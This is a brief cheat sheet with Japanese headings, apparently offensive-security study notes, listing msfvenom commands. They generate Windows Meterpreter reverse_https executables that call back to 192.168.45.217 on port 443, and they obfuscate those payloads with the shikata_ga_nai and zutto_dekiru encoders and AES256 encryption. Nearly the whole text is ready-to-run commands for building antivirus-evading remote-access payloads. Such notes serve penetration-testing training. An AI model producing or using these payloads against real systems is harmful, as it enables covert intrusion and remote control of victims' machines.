## Encoders

エンコーダ一覧の表示
```bash
msfvenom --list encoders
```

`x86/shikata_ga_nai`エンコーダ
x86版
```bash
sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 -e x86/shikata_ga_nai -f exe
```

x64版
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 -f exe -o met64.exe
```


`x64_/zutto_dekiru`エンコーダ
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
```


## Encrypt
暗号化一覧
```bash
msfvenom --list encrypt
```

`aes256`
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
```